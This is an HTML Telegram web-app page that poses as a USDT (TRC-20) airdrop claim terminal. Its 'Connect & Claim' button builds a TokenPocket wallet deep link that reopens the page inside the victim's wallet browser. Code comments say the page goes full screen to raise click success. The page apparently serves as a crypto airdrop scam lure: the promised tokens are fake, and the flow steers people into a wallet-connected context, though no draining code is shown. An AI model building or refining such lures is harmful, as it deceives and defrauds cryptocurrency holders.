<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AIRDROP TERMINAL</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        #terminal {
            width: 90%;
            border: 2px solid #ff0000;
            padding: 20px;
            box-shadow: 0 0 15px #ff0000;
            background: rgba(20, 0, 0, 0.8);
        }
        .btn {
            background: #ff0000;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
            text-transform: uppercase;
            box-shadow: 0 0 10px #ff0000;
        }
        .glitch {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div id="terminal">
        <h2>> SYSTEM: AIRDROP_DETECTED</h2>
        <p>> STATUS: READY_TO_CLAIM</p>
        <p>> TOKEN: USDT (TRC-20)</p>
        <p id="wallet-addr">> WALLET: NOT CONNECTED</p>
    </div>
    <button class="btn glitch" onclick="connectAndClaim()">Connect & Claim</button>

<script>
    // 1. 初始化 Telegram 环境
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand(); // 让页面全屏，增加点击成功率

    function connectAndClaim() {
    tg.HapticFeedback.notificationOccurred('success');
    
    // 1. 重新定义更严谨的 TP 协议格式
    // 注意：url 必须是完整的 https 链接
    const currentUrl = window.location.href;
    const tpParams = {
        "url": currentUrl,
        "chain": "TRON", // 明确指定波场链
        "source": "Telegram"
    };
    
    // 构造标准的 TP DApp 协议
    const tpUrl = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify(tpParams));

    // 2. 视觉反馈（你的黑客终端效果）
    const terminal = document.getElementById('terminal');
    terminal.innerHTML += "<p style='color:#0f0'>> [SUCCESS]: PROTOCOL_CONSTRUCTED</p>";
    terminal.innerHTML += "<p style='color:#ff0'>> [ACTION]: REQUESTING_WALLET_OPEN...</p>";

    // 3. 核心跳转：尝试两种方式
    try {
        // 优先使用 Telegram 原生方法
        tg.openLink(tpUrl);
    } catch (e) {
        // 如果原生方法失败，尝试强制重定向
        window.location.href = tpUrl;
    }
}
</script>
</body>
</html>
